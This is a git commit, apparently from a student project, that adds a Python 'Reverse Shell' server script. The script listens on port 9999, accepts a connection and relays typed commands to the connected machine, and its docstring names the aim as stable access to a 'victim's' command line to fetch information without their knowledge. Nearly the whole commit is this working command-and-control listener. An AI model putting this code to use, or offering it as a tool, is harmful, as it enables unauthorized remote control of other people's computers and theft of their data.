37a1bdcbb42b9de7302e7d987cce7a9a373037b5
aman-Tomar-30 <aman.23bcon0600@jecrcu.edu.in>
2026-09-12 14:13:27 +0530

    intial commit; try to implement socket

---
+++ Reverse Shell/server.py
@@ -0,0 +1,73 @@
+"""This file goes to server (static ip) for stably access to victim's command-line interface
+to run commands to fetch information without knowing them"""
+
+import socket
+import sys
+
+# create socket (connect two computers)
+def create_socket():
+    try:
+        global host
+        global port
+        global s
+
+        host = ""
+        port = 9999
+        s = socket.socket()
+
+    except socket.error as msg:
+        print(f"Error: {msg}")
+
+# Binding the socket and listening for connections
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+
+        print(f"binding the Port: {port}")
+        s.bind((host, port))
+        s.listen(5)
+
+    except socket.error as msg:
+        print(f"Error : {msg} \n Retry....")
+        bind_socket()
+
+# Establish connection with client (the socet must be listening)
+
+def socket_accept():
+    try:
+        global s
+        conn, address = s.accept()
+        print(f"connection etablished with {address[0]}")
+
+        send_commands(conn)
+        conn.close()
+    except socket.error as msg:
+        print(f"Error : {msg}")
+
+# sends commands to client, victim or friend
+def send_commands(connection):
+    while True:
+        global s
+
+        cmd = input(">>> ")
+        if cmd == "exit":
+            connection.close()
+            s.close()
+            sys.exit()
+
+        if len(str.encode(cmd)) > 0: #encode into byte format
+            connection.send(str.encode(cmd))
+            client_res = str(connection.recv(1024), "utf-8")
+            print(client_res, end="")
+
+def main():
+    try:
+        create_socket()
+        bind_socket()
+        socket_accept()
+    except KeyboardInterrupt:
+        print("Server goes Down")
+
+main()
